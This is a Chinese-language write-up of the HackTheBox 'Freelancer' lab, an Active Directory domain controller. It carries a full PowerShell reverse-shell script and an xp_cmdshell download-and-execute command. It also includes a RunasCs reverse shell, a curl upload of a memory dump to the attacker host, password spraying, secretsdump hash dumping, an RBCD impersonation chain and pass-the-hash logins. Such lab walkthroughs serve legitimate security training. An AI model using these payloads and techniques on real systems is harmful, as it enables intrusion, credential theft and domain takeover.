---
title: "HTB Freelancer"
description: "HackTheBox篇之Freelancer"

date: 2024-10-30T19:15:05+08:00
lastmod: 2025-11-10T17:00:59+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - MSSQL
  - GenericWrite
  - RBCD
---
<!--more-->

> 靶机ip：10.10.11.5

# 知识点

* MSSQL通过xp_cmdshell 实现RCE
* 密码喷洒
* 滥用GenericWrite
* RBCD约束委派
* PTH传递攻击

# 信息收集

## nmap扫描

```bash
nmap --min-rate 10000 -A -sV -sC -p- 10.10.11.5
```

```nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 19:20 CST
Warning: 10.10.11.5 giving up on port because retransmission cap hit (10).
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.11.5, 16) => Operation not permitted
Offending packet: TCP 10.10.16.4:35511 > 10.10.11.5:8189 S ttl=44 id=31021 iplen=44  seq=2972970908 win=1024 <mss 1460>
Nmap scan report for 10.10.11.5
Host is up (0.83s latency).
Not shown: 59837 closed tcp ports (reset), 5672 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.25.5
|_http-title: Did not follow redirect to http://freelancer.htb/
|_http-server-header: nginx/1.25.5
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-30 16:21:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
55297/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.10.11.5\SQLEXPRESS:
|     Instance name: SQLEXPRESS
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 55297
|     Named pipe: \\10.10.11.5\pipe\MSSQL$SQLEXPRESS\sql\query
|_    Clustered: false
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-10-30T16:19:02
|_Not valid after:  2054-10-30T16:19:02
| ms-sql-ntlm-info:
|   10.10.11.5\SQLEXPRESS:
|     Target_Name: FREELANCER
|     NetBIOS_Domain_Name: FREELANCER
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: freelancer.htb
|     DNS_Computer_Name: DC.freelancer.htb
|     DNS_Tree_Name: freelancer.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-10-30T16:23:30+00:00; +5h00m04s from scanner time.
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|Vista|10|2012|Longhorn|7|8.1|2016|11 (94%)
OS CPE: cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_8
Aggressive OS guesses: Microsoft Windows Server 2019 (94%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 1709 - 1909 (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 2004 (90%), Microsoft Windows Longhorn (90%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows Server 2012 or Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-10-30T16:23:12
|_  start_date: N/A
|_clock-skew: mean: 5h00m03s, deviation: 0s, median: 5h00m03s

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   689.59 ms 10.10.16.1
2   366.60 ms 10.10.11.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.91 seconds
```

开放若干端口，可以看到这是一台域控，根据80端口的结果，可以发现域名`freelancer.htb`，将其添加到`/etc/hosts`中，同时存在`SQL Server`

## SMB

```bash
smbclient -L //10.10.11.5
```

![image-20241030193415328](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030193421240-862466878.png)

smb没有重要信息

## 80端口

![image-20241030195013398](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030195019202-355984579.png)

扫描一下目录

```bash
gobuster dir -u http://freelancer.htb/ -w /usr/share/wordlists/dirb/common.txt -t 5
```

![image-20241030194515723](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030194522012-1201054933.png)

访问后还是没什么重要信息

![image-20241030210916487](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030210922158-590770136.png)

随便点了篇文章发现url的数据像是用户的编号

![image-20241030210944922](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030210950614-402962867.png)

测试后发现id为2的时候是admin用户

![image-20241030195941232](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030195947536-985652884.png)

注册个自由账户登录后发现路由跳转到`/job/search/`

![image-20241030200352902](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030200358580-254071980.png)

发现还是没有登陆进去

在注册个员工账户

![image-20241030201044315](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241103185552789-1784702947.png)

发现没激活不让登录，注意到两个账户登陆的表单是同一个，还有个忘记密码，尝试一下

![image-20241030201429836](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030201435602-1815788951.png)

通过忘记密码功能成功以员工身份登录到后台

# 获得网站admin权限

![image-20241030203159702](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030203205421-979958180.png)

注意到有个QRcode，扫描一下

![image-20241030203720362](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030203726339-1392968181.png)

有一个url，访问url会跳转到当前用户

注意到中间可能是base64编码

![image-20241030203757961](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030203803580-1093742398.png)

解码后发现是10012

之前知道 admin 的 id 是2，感觉可以尝试伪造一下

**ps: 注意每个QRcode生成的链接有时效性，需要在生成QRcode后就替换并访问（这里我试了好多次）**

![image-20241030211606674](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030211612757-592831591.png)

获取到网站的admin权限

# MSSQL通过RCE获得shell

当前页面并没有什么新的东西，之前目录扫描知道有admin路由，访问一下

![image-20241031155320549](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031155340969-1949040649.png)

注意到右下角有个`SQL Terminal`

![image-20241031160042048](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241103185612117-1781510714.png)

简单执行`select @@version;`发现可以执行sql语句

尝试利用sql的执行命令

![image-20241031160156445](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031161914233-762073518.png)

利用SQL枚举，尝试`xp_cmdshell`

[Pentesting MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands)

```sql
SELECT SYSTEM_USER;
```

![image-20241031162228101](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031162235113-1486071814.png)

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```



![image-20241031162238631](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031162246707-191596372.png)

```sql
EXECUTE AS LOGIN = 'sa';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```



![image-20241031162249651](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031162256855-652593550.png)

```sql
EXECUTE AS LOGIN = 'sa';EXEC xp_cmdshell whoami;
```



![image-20241031162300569](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031162307485-1009571644.png)

接着执行命令获取shell，但是测试后发现有杀软

准备一个ps1脚本（找了好久才找到，大多数都被杀了，人都麻了）

```powershell
#shell.ps1
do {
    # Delay before establishing network connection, and between retries
    Start-Sleep -Seconds 1

    # Connect to C2
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('10.10.16.4',8888)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

# Writes a string to C2
function WriteToStream ($String) {
    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    # Write to C2
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below.
WriteToStream ''

# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    # Write output to C2
    WriteToStream ($Output)
}
# Closes the StreamWriter and the underlying TCPClient
$StreamWriter.Close()

```

启动监听

![image-20241031163426947](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031163434222-1715803624.png)

```sql
EXECUTE AS LOGIN = 'sa';
EXECUTE xp_cmdshell 'powershell -c iex(iwr -usebasicparsing http://10.10.16.4/shell.ps1)';
```

![image-20241031180120472](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031180128183-1871641448.png)

成功获得shell

# sql_svc->mikasaAckerman

先简单查看一下

![image-20241031181444181](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031181451778-69892735.png)

在`C:\users\sql_svc\downloads\SQLEXPR-2019_x64_ENU`目录下的`sql-Configuration.INI`文件中找到俩密码`IL0v3ErenY3ager`和`t3mp0r@ryS@PWD`

![image-20241031182527902](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031182535485-866862623.png)

将`C:\Users`中的用户名保存到`users`文件中，密码保存至`passwd`文件中，尝试密码喷洒

```bash
crackmapexec smb freelancer.htb -u users -p passwd
```

![image-20241031183819307](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031183827237-1394554085.png)

找到一组正确的凭据`mikasaAckerman:IL0v3ErenY3ager`

但是`winrm`并没有成功的凭据

使用[RunasCs](https://github.com/antonioCoco/RunasCs)进行横向，先上传至靶机

```powershell
curl 10.10.16.4/RunasCs.exe -outfile RunasCs.exe
```

![image-20241031185131983](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031185139899-1944749946.png)

靶机执行

```powershell
.\RunasCs.exe mikasaAckerman "IL0v3ErenY3ager" -d freelancer.htb cmd -r 10.10.16.4:8889
```

![image-20241031185724497](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031185732331-1762507818.png)

成功获得`mikasaackerman`用户权限

![image-20241031185846521](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031185853820-131256646.png)

在`Desktop`找到`user.txt`

# mikasaAckerman->lorra199

在`mikasaAckerman`桌面还有两个文件，其中一个是压缩包

先看下`mail.txt`

![image-20241031190657225](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031190704941-974279194.png)

通过smb文件共享来传输文件，这里使用`httpuploadexfil`工具实现 

先在攻击机建立监听

```bash
./httpuploadexfil :9999 /root/HackTheBox/Freelancer/share
```

![image-20241031192048419](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031192056276-848032017.png)

靶机执行

```powershell
curl -F "file=@MEMORY.7z" http://10.10.16.4:9999/p
```

![image-20241031192800564](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031192808087-2027884009.png)

![image-20241031193154701](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031193202144-454390878.png)

解压后发现是个 `DMP`文件

使用[MemProcFS](https://github.com/ufrisk/MemProcFS)进行分析

```bash
./memprocfs -device /root/HackTheBox/Freelancer/share/MEMORY.DMP -mount /root/HackTheBox/Freelancer/dmp_mnt
```

![image-20241031194454182](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031194502165-752955147.png)

将其挂载到一个空目录，在切换终端查看该目录

![image-20241031194549629](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031194557174-879320302.png)

![image-20241031194708714](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031194716386-270783784.png)

发现在`registry/hive_files`目录下找到SAM、SYSTEM和SECURITY文件

使用`secretsdump`导出hash值

```bash
secretsdump.py -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive local
```

![image-20241031194939897](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031194947565-950391359.png)

发现在最下面有一串明文密码`PWN3D#l0rr@Armessa199`

继续尝试密码喷洒

![image-20241031195251538](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031195259082-1047005503.png)

找到一组凭据`lorra199:PWN3D#l0rr@Armessa199`

![image-20241031201215390](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031201223159-1255973466.png)

winrm发现也可以使用，直接使用`evil-winrm`登录

![image-20241031201402294](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031201409985-1471373558.png)

成功登录`lorra199`用户

# 权限提升

## bloodhound信息收集

先使用`bloodhound-python`信息搜集

```bash
bloodhound-python -ns 10.10.11.5 --dns-tcp -d freelancer.htb -u lorra199 -p PWN3D#l0rr@Armessa199 -c All --zip
```

![image-20241031202039091](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031202047153-583515341.png)

![image-20241031204327239](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031204334572-282778564.png)

发现`lorra199`用户属于`AD RECYCLE BIN`组

![image-20241031205153099](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031205200402-623938844.png)

同时还注意到`AD RECYCLE BIN`组对`DC`有`GenericWrite`权限，可以修改该账户的属性，包括设置或更改允许委派到的服务列表，这可以间接实现约束委派（RBCD）

## RBCD

> 在计算机对象上滥用 `GenericWrite` 的一种方法是在域上创建一台假计算机，然后写入 DC，该假计算机能够作为 DC 进行委派（使用基于资源的约束委派 （RBCD））。然后，我可以作为 DC 请求票证并充当 DC。

* 添加计算机

```bash
addcomputer.py -computer-name 'Ya$' -computer-pass 'Aa123456!' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199'
```

![image-20241031205832864](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031205840693-1296189239.png)

* 使用RBCD，如果这台 PC 属于“域管理员”组，我们将授予它冒充为用户“管理员”的权限

```bash
rbcd.py -delegate-from 'Ya$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
```

![image-20241031210239085](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031210246405-289400388.png)

* 使用getST获取服务票证以访问服务CIFS

在请求票据之前，先与服务器时间同步

```bash
ntpdate -s freelancer.htb
```

再请求票据

```bash
getST.py -spn 'cifs/dc.freelancer.htb' -dc-ip 10.10.11.5 -impersonate 'administrator' 'freelancer.htb/Ya:Aa123456!'
```

![image-20241031211224615](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031211232406-563143332.png)

导入票据，然后使用secretdump获取hash值

```bash
export KRB5CCNAME=administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache
```

````bash
secretsdump.py 'freelancer.htb/Administrator@DC.freelancer.htb' -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntl
````

![image-20241031211635032](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031211643068-790736658.png)

最后`evil-winrm`登录

````bash
evil-winrm -i freelancer.htb -u administrator -H '0039318f1e8274633445bce32ad1a290'
````

![image-20241031211727679](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031211735148-656830288.png)

![image-20241031211803217](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031211810839-438087994.png)

在`Desktop`找到`root.txt`